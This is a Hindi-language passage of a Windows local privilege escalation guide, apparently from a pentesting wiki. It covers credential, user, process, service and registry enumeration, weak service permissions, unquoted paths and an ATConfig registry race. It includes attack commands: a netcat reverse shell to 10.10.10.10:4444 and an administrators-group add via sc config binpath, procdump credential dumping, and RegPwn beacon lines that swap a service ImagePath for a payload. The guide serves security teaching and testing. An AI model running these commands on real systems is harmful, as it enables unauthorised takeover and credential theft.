**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य डिवाइस पर संग्रहीत credentials को pass-the-hash attacks जैसे खतरों से सुरक्षित रखना है। [**Credential Guard के बारे में अधिक जानकारी यहाँ उपलब्ध है।**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### कैश्ड क्रेडेंशियल्स

**डोमेन क्रेडेंशियल्स** को **Local Security Authority** (LSA) द्वारा प्रमाणित किया जाता है और ऑपरेटिंग सिस्टम के घटक इनका उपयोग करते हैं। जब किसी उपयोगकर्ता का लॉगऑन डेटा किसी पंजीकृत सुरक्षा पैकेज द्वारा प्रमाणित किया जाता है, तो आमतौर पर उस उपयोगकर्ता के लिए डोमेन क्रेडेंशियल्स स्थापित किए जाते हैं।\
[**कैश्ड क्रेडेंशियल्स के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## उपयोगकर्ता और समूह

### उपयोगकर्ताओं और समूहों की गणना करें

जाँचें कि जिन समूहों के आप सदस्य हैं, उनमें से किसी के पास दिलचस्प permissions तो नहीं हैं।

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### विशेषाधिकार प्राप्त समूह

यदि आप **किसी विशेषाधिकार प्राप्त समूह के सदस्य हैं, तो संभव है कि आप अपने विशेषाधिकार बढ़ा सकें**। विशेषाधिकार प्राप्त समूहों और विशेषाधिकार बढ़ाने के लिए उनका दुरुपयोग करने के तरीकों के बारे में यहाँ जानें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

इस पेज पर **token** के बारे में **और जानें**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)।\
दिलचस्प tokens के बारे में जानने और उनका दुरुपयोग करने के तरीकों के लिए यह पेज देखें:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### लॉग इन उपयोगकर्ता / Sessions

```bash
qwinsta
klist sessions
```

### होम फ़ोल्डर

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### पासवर्ड नीति

```bash
net accounts
```

### क्लिपबोर्ड की सामग्री प्राप्त करें

```bash
powershell -command "Get-Clipboard"
```

## चल रही प्रक्रियाएँ

### फ़ाइल और फ़ोल्डर अनुमतियाँ

सबसे पहले, प्रक्रियाओं की सूची बनाते समय **प्रक्रिया की command line में पासवर्ड खोजें**।\
जाँचें कि क्या आप **चल रही किसी binary को overwrite कर सकते हैं**, या संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का फायदा उठाने के लिए binary फ़ोल्डर पर आपके पास write permissions हैं:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

हमेशा जांचें कि कहीं [**electron/cef/chromium debuggers** चल तो नहीं रहे; privilege escalation के लिए उनका दुरुपयोग किया जा सकता है](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)।

Debugger listener थोड़े समय के लिए चल सकता है, इसलिए एक passive port snapshot में उसका न दिखना यह साबित नहीं करता कि वह कभी exposed नहीं था। दिखने वाले किसी भी listener का PID, process owner और उस तक कम privileges वाले user की पहुंच की क्षमता के साथ मिलान करें; केवल application name या debug flag से यह साबित नहीं होता कि cross-user code execution संभव है। नियमित enumeration को passive रखें और debugger commands न भेजें।

**Processes की binaries की permissions जांचना**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**प्रोसेस बाइनरीज़ के फ़ोल्डरों की अनुमतियों की जाँच (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor directories

Snort 2, `snort.exe -c <config>` से चुनी गई configuration में घोषित `dynamicpreprocessor directory` से shared libraries load कर सकता है। यदि कोई scheduled task या service Snort को किसी दूसरे account के तहत चलाती है, तो उसी configuration और घोषित module directory की ACL की जाँच करें। यदि आपका token वहाँ files बना सकता है, तो अगली बार task या service द्वारा modules load किए जाने पर उस path में code execution की संभावना की समीक्षा करें। Run-as account के effective privileges, active configuration, module compatibility और किसी भी deny या share restrictions की पुष्टि करें; केवल writable directory से privilege escalation साबित नहीं होता। [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) में runtime module loading का वर्णन है।

### Writable document root वाला privileged web service

Windows Apache installation में service के executable path और run-as account की तुलना उसके active `httpd.conf` में दिए गए `DocumentRoot` से करें। सामान्य XAMPP layout के लिए, `C:\xampp\apache\conf\httpd.conf` और उसके configured document root की ACL जाँचें; यह अक्सर `C:\xampp\htdocs` होता है। यदि कम privileges वाला user उस root में files बना सकता है, जबकि Apache `LocalSystem` के रूप में चलता है, तो server-side code execution host privilege boundary पार कर सकता है। पुष्टि करें कि service चल रही है, ठीक वही path serve किया जा रहा है और server-side handler उस file type को process करता है; केवल writable root से file creation साबित होती है। कोई probe लिखे बिना ACL की जाँच करें:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

एक conventional WAMP installation में, service किसी versioned `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (या 32-bit layout के लिए `C:\wamp\...`) को point कर सकती है। इसकी configuration पास में `conf\httpd.conf` के अंतर्गत और default root `C:\wamp64\www` या `C:\wamp\www` हो सकता है। Exact service image, उसका run-as identity, effective `DocumentRoot` (जिसमें `${INSTALL_DIR}` का expansion और virtual-host overrides शामिल हैं) और root ACL—इन सबको साथ में जाँचें। WAMP directory का writable होना यह साबित नहीं करता कि Apache `SYSTEM` के रूप में चलता है या submitted file को execute करता है। [Apache दस्तावेज़ देता है कि Windows service अपनी configuration कैसे चुनती है](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service)।

### Writable IIS root और application-pool network identity

IIS में, `applicationHost.config` से writable physical directory को किसी **active site/application** से map करें, फिर उसका configured pool और server-side handler पहचानें। Served directory में रखा code pool के रूप में तभी चलता है, जब IIS उस file type को process करे और route तक पहुँचा जा सके। Writable directory को code execution मानने से पहले, current user की effective create-file access, site runtime state, handler और per-path overrides जाँचें।

ASP.NET dynamic compilation में एक अलग path की समीक्षा ज़रूरी है: application की compilation directory के अंतर्गत generated files। Default रूप से यह संबंधित .NET Framework installation के अंतर्गत `Temporary ASP.NET Files` directory होती है, लेकिन application का `<compilation tempDirectory>` इसे बदल सकता है। [Microsoft इसके location और per-application subdirectories का दस्तावेज़ देता है](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) और [application pools के एक-दूसरे पर trust न करने की स्थिति में compilation directories को अलग रखने की सलाह देता है](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories)। यदि कम privileged token, **विशिष्ट** application के cache में generated source को बदल सकता है, तो पता करें कि क्या वह application उसे अधिक privileged [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) के अंतर्गत फिर से compile करती है। केवल file या directory ACL से code execution साबित नहीं होता: cache को active application, effective token और ACL, compilation settings, process identity और किसी भी recompile के समय से correlate करें। Read-only metadata review करें; enumeration के दौरान compilation trigger न करें और न ही cache files बदलें।

`ApplicationPoolIdentity` या `NetworkService` के रूप में configured IIS pool, आम तौर पर domain resources के लिए **host computer account** से authenticate करता है, भले ही उसका local token कम privileged हो। `LocalSystem` स्थानीय स्तर पर पहले से ही अत्यधिक privileged होता है और network पर computer account का उपयोग भी करता है; `LocalService` आम तौर पर anonymous network credentials प्रस्तुत करता है। `SpecificUser` pool इसके बजाय अपना configured account उपयोग करता है। [Microsoft इन identity types का दस्तावेज़ देता है](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) और [application-pool network identity का भी](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)। छोड़ी गई identity setting, pool defaults से inherit हो सकती है; ये defaults IIS generations में अलग-अलग होते हैं, इसलिए pool name देखकर अनुमान लगाने के बजाय effective configuration निर्धारित करें। यदि code execution ऐसे pool तक पहुँचता है जिसकी network identity computer account है, तो उस **विशिष्ट computer** के directory rights का आकलन करें। [DCSync](../active-directory-methodology/dcsync.md) के लिए domain naming context पर replication rights आवश्यक हैं; केवल machine-account ticket या host role से वे साबित नहीं होते। Passive enumeration में configuration और ACLs की जाँच करें—बिना file upload किए, network authentication किए या tickets माँगे।

यदि कोई readable ASP.NET handler helper process शुरू करता है, तो request से मिले value को authentication, decryption, validation और command construction के दौरान trace करें। जो handler decoded token को `ProcessStartInfo("cmd", "/c ...")` में concatenate करता है, वह shell metacharacters को command बदलने दे सकता है; [Microsoft, `cmd` के special characters का दस्तावेज़ देता है](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd)। यह स्थापित करें कि कोई untrusted caller वास्तव में decoded value को प्रभावित कर सकता है और handler तक पहुँच सकता है; फिर effective application-pool या impersonated identity और child process की identity निर्धारित करें। केवल readable source line, localhost listener या token-format की कमजोरी से privileged command execution साबित नहीं होता। Passive enumeration के दौरान forged requests भेजे बिना या helper चलाए बिना source और pool configuration की समीक्षा करें।

Windows पर PHP service के लिए, request-controlled path जिसे [`include` या `require`](https://www.php.net/manual/en/function.include.php) में pass किया जाता है, worker की identity के अंतर्गत कम-privileged user की writable PHP file को evaluate कर सकता है। पुष्टि करें कि request उस statement तक पहुँच सकती है, resolved path ऐसी file को point करता है जिसे कम-privileged user modify कर सकता है और worker read कर सकता है, लागू PHP path restrictions include की अनुमति देती हैं, और worker वास्तव में अधिक privileges के साथ चलता है। केवल loopback listener या writable file से यह chain साबित नहीं होती; passive enumeration के दौरान endpoint invoke किए बिना source, service identity और file ACLs की जाँच करें।

### Memory Password mining

आप sysinternals के **procdump** का उपयोग करके चल रही process का memory dump बना सकते हैं। FTP जैसी services के **credentials memory में clear text में होते हैं**; memory dump करके credentials पढ़ने की कोशिश करें।

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### असुरक्षित GUI ऐप्स

**SYSTEM के रूप में चलने वाले ऐप्स किसी उपयोगकर्ता को CMD खोलने या डायरेक्टरी ब्राउज़ करने दे सकते हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), "command prompt" खोजें, फिर "Click to open Command Prompt" पर क्लिक करें।

### Privileged project-file import

जो ऐप lower-user-writable drop directory से प्रोजेक्ट अपने-आप खोलता है, वह importer के account के तहत input trust boundary पार करता है। **ठीक writable path**, उसे खोलने वाली process या task, उसकी effective identity और parser build की समीक्षा करें। [Ghidra में ऐतिहासिक project open/restore issue](https://github.com/NationalSecurityAgency/ghidra/issues/71) के कारण project metadata में XML external entities इस्तेमाल की जा सकती थीं; Windows पर network entity importing account से authentication करा सकती थी, यदि [outbound SMB और NTLM policy](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) इसकी अनुमति दें। यह credential exposure का सुराग है, तुरंत administrator access नहीं: response को किसी अलग authorized या vulnerable path के ज़रिए इस्तेमाल किया जा सकना चाहिए, और मौजूदा builds का आकलन उनकी वास्तविक patch state के आधार पर किया जाना चाहिए। Passive enumeration के दौरान crafted project न खोलें; import workflow और ACLs की जाँच करें।

## Services

Service Control Manager (SCM) object का [`SC_MANAGER_CREATE_SERVICE` अधिकार](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), किसी मौजूदा service पर मिलने वाले अधिकारों से अलग है। इस अधिकार के लिए सफल read-only [`OpenSCManager` access request](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) समीक्षा का सुराग है, इस बात का प्रमाण नहीं कि नई service चल सकती है। [`CreateService` एक handle लौटाता है](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew), जिसमें creation के समय माँगा गया service access होता है; बाद में service को दोबारा खोलने पर अलग access check होता है, जो विफल हो सकता है, भले ही मूल handle इस्तेमाल किया जा सके। Effective local या remote token, granted handle rights, service account, start policy और executable path की अलग-अलग पुष्टि करें। Passive enumeration के दौरान service न बनाएँ और न शुरू करें।

Remote service-install path के लिए, उन SCM अधिकारों को target पर ऐसी share से जोड़कर देखें, जिस पर **वही network logon** लिख सकता हो; साथ में underlying NTFS ACL और ऐसा local executable path भी जाँचें, जिसे service account चला सके। यदि असामान्य रूप से व्यापक SCM अधिकार और file-placement path, दोनों मौजूद हों, तो non-admin account इस boundary को पार कर सकता है; administrative share होना अनिवार्य नहीं है। केवल share पर write access या केवल SCM create-service का सुराग यह साबित नहीं करता कि नई service उच्च identity के तहत शुरू हो सकती है।

मौजूदा service startup, shutdown या किसी अन्य lifecycle event पर helper executable चला सकती है, भले ही वह helper उसके `ImagePath` में मौजूद न हो। यदि helper का नाम lower-user-writable directory में resolve होता है और service उच्च identity के तहत चलती है, तो missing helper file एक conditional replacement candidate है। **वास्तविक service code या documented helper invocation**, resolved executable path और search order, directory बनाने के अधिकार, service identity और उपलब्ध lifecycle trigger की पुष्टि करें। Writable service directory या missing file अकेले यह साबित नहीं करते कि service उस file को लोड करती है; passive review में service को शुरू या बंद न करें।

मौजूदा service के लिए, [`SERVICE_START` के साथ `StartService` को arguments दिए जा सकते हैं](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); यह [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) से अलग है। Start access को केवल control right से अधिक मानने से पहले service के code या documented interface की समीक्षा करें। यदि वह caller द्वारा चुने गए argument को log या export path के रूप में इस्तेमाल करती है, तो service identity, argument से write तक का सटीक flow, path restrictions और **बनाई गई file** की permissions की पुष्टि करें। Protected directory में लिखना तभी escalation का कारण बन सकता है, जब कोई अलग privileged consumer या loader उस file को स्वीकार करे; केवल writable log या start right पर्याप्त नहीं है। Passive inventory में service शुरू न करें और test file न बनाएँ।

NSClient++ monitoring agent के लिए, पढ़ी जा सकने वाली `nsclient.ini` एक **configuration review lead** है: उसमें web credentials हो सकते हैं, जबकि `boot.ini` configuration को किसी दूसरी जगह पर redirect कर सकती है। वास्तविक service account, WEB listener और access policy, तथा authenticated role settings या scripts बदल सकती है या नहीं—इनकी जाँच करें। Privileged execution के लिए `CheckExternalScripts` (या कोई अन्य enabled execution path), command register या modify करने का प्रभावी अधिकार, और ऐसा trigger भी ज़रूरी है जो उसे service identity के तहत चलाए। केवल local user के लिए उपलब्ध listener तक पहुँचना संभव हो सकता है, लेकिन file path, password या listener अकेले उन अधिकारों को साबित नहीं करते। Passive enumeration के दौरान secrets दिखाए बिना या web API invoke किए बिना metadata और permissions की समीक्षा करें। देखें [NSClient++ file layout](https://nsclient.org/docs/concepts/file-layout/), [web और script security guidance](https://nsclient.org/docs/setup/securing/), और [external-script configuration](https://nsclient.org/docs/reference/check/CheckExternalScripts/)।

जिस service का `ImagePath` `nssm.exe` हो, उसके लिए service का वास्तविक run-as account और उसका `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` value देखें: [NSSM child application को वहाँ store करता है](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), जबकि `AppDirectory` उसका configured working directory होता है। Wrapper की permissions को पूरी service boundary मानने से पहले child executable और उसकी parent-directory ACLs जाँचें। उस child द्वारा उपलब्ध कराया गया local WCF या SOAP endpoint समीक्षा का अलग सुराग है: पुष्टि करें कि lower-privileged user उस listener तक पहुँच सकता है, उसके input को ठीक वही operation स्वीकार करता है और service child उस unsafe operation को उच्च identity के तहत चलाता है। केवल service account, endpoint URL या writable path escalation साबित नहीं करते; passive enumeration के दौरान service operations invoke न करें।

Custom WCF operation के लिए, caller-controlled string का किसी भी PowerShell runspace तक पहुँचने वाला flow trace करें। [`Pipeline.Commands.AddScript` script text जोड़ता है](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), और [`Pipeline.Invoke` pipeline चलाता है](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke)। [`Windows transport credentials वाला `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) client को authenticate करता है, लेकिन उस **विशिष्ट** operation को call करने की authorization और runspace की effective identity अलग से जाँची जानी चाहिए। यदि lower-privileged caller का input उच्च service identity के तहत `AddScript` तक पहुँचता है, तो यह code-execution boundary है; केवल listening port, authenticated client या किसी असंबंधित assembly में unused method इसका प्रमाण नहीं है। Enumeration के दौरान endpoint invoke किए बिना deployed service, contract, authorization और impersonation settings की static समीक्षा करें।

Service Triggers कुछ शर्तें पूरी होने पर Windows को service शुरू करने देते हैं (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh आदि)। SERVICE_START अधिकार न होने पर भी आप अक्सर triggers activate करके privileged services शुरू कर सकते हैं। Enumeration और activation की तकनीकें यहाँ देखें:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio diagnostic collector service

C/C++ tooling वाले Visual Studio installations में `VSStandardCollectorService150` शामिल हो सकती है, जो `LocalSystem` के रूप में चलने के लिए configured diagnostic service है। [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) में junction और object-manager-link race का इस्तेमाल करके service DACL reset को redirect किया गया था। प्रदर्शित escalation के लिए usable Visual Studio Setup WMI Provider MSI repair path और उसका `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` target भी ज़रूरी था। इस component को जनवरी 2024 में ठीक किया गया था।

Passive triage के लिए, उस service का account और binary path देखें, जाँचें कि Setup WMI compiler path मौजूद है या नहीं, और installed component का patch status सत्यापित करें। केवल service entry, Visual Studio product version या compiler file यह साबित नहीं करते कि host vulnerable है। जाँच के लिए service शुरू करने या repair चलाने की ज़रूरत नहीं है।

Services की सूची प्राप्त करें:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### अनुमतियाँ

किसी service की जानकारी पाने के लिए आप **sc** का उपयोग कर सकते हैं.

```bash
sc qc <service_name>
```

प्रत्येक service के लिए आवश्यक privilege level की जाँच करने हेतु _Sysinternals_ का binary **accesschk** उपलब्ध रखना recommended है।

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

यह जाँचना recommended है कि क्या "Authenticated Users" किसी भी service को modify कर सकते हैं:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[आप XP के लिए accesschk.exe यहाँ से डाउनलोड कर सकते हैं](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सेवा सक्षम करें

यदि आपको यह त्रुटि मिल रही है (उदाहरण के लिए SSDPSRV के साथ):

_System error 1058 has occurred._\
_सेवा शुरू नहीं की जा सकती, क्योंकि यह अक्षम है या इससे जुड़ा कोई सक्षम डिवाइस नहीं है।_

आप इसे इस तरह सक्षम कर सकते हैं

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**ध्यान दें कि (XP SP1 के लिए) upnphost सेवा काम करने के लिए SSDPSRV पर निर्भर करती है**

**इस समस्या का एक और समाधान** यह चलाना है:

```
sc.exe config usosvc start= auto
```

### **service binary path संशोधित करें**

इस स्थिति में, जब "Authenticated users" समूह के पास किसी service पर **SERVICE_ALL_ACCESS** हो, तो service की executable binary को संशोधित करना संभव है। **sc** को संशोधित और execute करने के लिए:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### सेवा पुनः प्रारंभ करें

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

विभिन्न permissions के ज़रिए privileges बढ़ाए जा सकते हैं:

- **SERVICE_CHANGE_CONFIG**: Service binary को फिर से configure करने की अनुमति देता है।
- **WRITE_DAC**: Permissions को फिर से configure करने की सुविधा देता है, जिससे service configurations बदलना संभव होता है।
- **WRITE_OWNER**: Ownership लेने और permissions को फिर से configure करने की अनुमति देता है।
- **GENERIC_WRITE**: Service configurations बदलने की क्षमता विरासत में देता है।
- **GENERIC_ALL**: Service configurations बदलने की क्षमता भी विरासत में देता है।

इस vulnerability का पता लगाने और इसका exploitation करने के लिए _exploit/windows/local/service_permissions_ का उपयोग किया जा सकता है।

### Services binaries की कमजोर permissions

अगर कोई service **`LocalSystem`**, **`LocalService`**, **`NetworkService`** या किसी privileged domain account के रूप में चलती है, लेकिन **कम privileges वाले users service EXE या उसके parent folder को modify कर सकते हैं**, तो अक्सर **binary को replace करके और service को restart करके** service को hijack किया जा सकता है।

**जाँचें कि क्या आप किसी service द्वारा execute की जाने वाली binary को modify कर सकते हैं**, या उस **folder पर write permissions हैं** जिसमें binary मौजूद है ([**DLL Hijacking**](dll-hijacking/index.html)**).**\
किसी service द्वारा execute की जाने वाली हर binary पाने के लिए **wmic** (system32 में नहीं) का उपयोग करें और **icacls** से अपनी permissions जाँचें:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

आप **sc** और **icacls** का भी उपयोग कर सकते हैं:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**, **`BUILTIN\Users`**, या **`Authenticated Users`** को दिए गए खतरनाक ACLs देखें, खासकर service executable या उसे रखने वाली directory पर **`(F)`**, **`(M)`**, या **`(W)`**। इसका एक व्यावहारिक दुरुपयोग इस प्रकार है:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` से service account और executable path की पुष्टि करें।
2. `icacls <path>` से पुष्टि करें कि binary writable है।
3. Service binary को payload या किसी मान्य malicious service binary से बदलें।
4. `sc stop <service_name> && sc start <service_name>` से service को restart करें (या reboot / service trigger का इंतज़ार करें)।

उपयोगी automated checks:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> यदि service किसी सामान्य user को उसे restart करने की अनुमति नहीं देता, तो जाँचें कि क्या वह boot पर अपने-आप start होता है, उसमें relaunch करने वाली failure action है, या उसे इस्तेमाल करने वाला application अप्रत्यक्ष रूप से trigger कर सकता है।

### Services registry modify permissions

आपको जाँचना चाहिए कि क्या आप किसी service registry को modify कर सकते हैं।\
आप service **registry** पर अपनी **permissions** **check** कर सकते हैं:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

जाँचें कि किसी विशेष service key पर **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास write-capable registry permissions हैं या नहीं। केवल ACL entry होना प्रभावी access का प्रमाण नहीं है: deny entries, मौजूदा token और inherited permissions भी मायने रखते हैं। Registry-key rights, service object के `SERVICE_CHANGE_CONFIG` और `SERVICE_START` rights से अलग होते हैं। Escalation के लिए एक उपयोगी service configuration field, service को trigger करने का तरीका और अधिक privileged service identity भी आवश्यक हैं। Microsoft के [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) और [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) देखें।

चलाए जाने वाले binary का Path बदलने के लिए:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### मनमाने HKLM value write के लिए Registry symlink race (ATConfig)

कुछ Windows Accessibility features प्रति-user **ATConfig** keys बनाते हैं, जिन्हें बाद में एक **SYSTEM** process द्वारा HKLM session key में कॉपी किया जाता है। Registry की **symbolic link race** इस privileged write को **किसी भी HKLM path** पर redirect कर सकती है, जिससे मनमाना HKLM **value write** primitive मिलता है।<sup>[[18]](#references)</sup>

मुख्य locations (उदाहरण: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` इंस्टॉल किए गए accessibility features की सूची रखता है।
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` user-controlled configuration स्टोर करता है।
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` logon/secure-desktop transitions के दौरान बनाया जाता है और user द्वारा writable होता है।

Abuse flow (CVE-2026-24291 / ATConfig):

1. वह **HKCU ATConfig** value सेट करें जिसे SYSTEM से लिखवाना चाहते हैं।
2. Secure-desktop copy trigger करें (जैसे, **LockWorkstation**), जिससे AT broker flow शुरू होता है।
3. **Race जीतें**: `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` पर **oplock** लगाएँ; oplock fire होने पर **HKLM Session ATConfig** key को protected HKLM target की ओर point करने वाले **registry link** से बदल दें।
4. SYSTEM attacker द्वारा चुनी गई value को redirected HKLM path पर लिखता है।

मनमाना HKLM value write मिलने के बाद, service configuration values को overwrite करके LPE तक पहुँचें:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

ऐसी service चुनें जिसे कोई सामान्य user start कर सके (जैसे, **`msiserver`**) और write के बाद उसे trigger करें। **ध्यान दें:** सार्वजनिक exploit implementation race के हिस्से के रूप में workstation को **lock** करता है।

उदाहरण tooling (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

अगर आपके पास किसी registry पर यह permission है, तो इसका मतलब है कि **आप इसमें से sub registries बना सकते हैं**। Windows services के मामले में, **arbitrary code execute करने के लिए यह काफी है:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

अगर executable का path quotes के अंदर नहीं है, तो Windows space से पहले आने वाले हर हिस्से को execute करने की कोशिश करेगा।

उदाहरण के लिए, _C:\Program Files\Some Folder\Service.exe_ path के लिए Windows इनको execute करने की कोशिश करेगा:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

सभी unquoted service paths की सूची बनाएं, built-in Windows services से संबंधित paths को छोड़कर:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
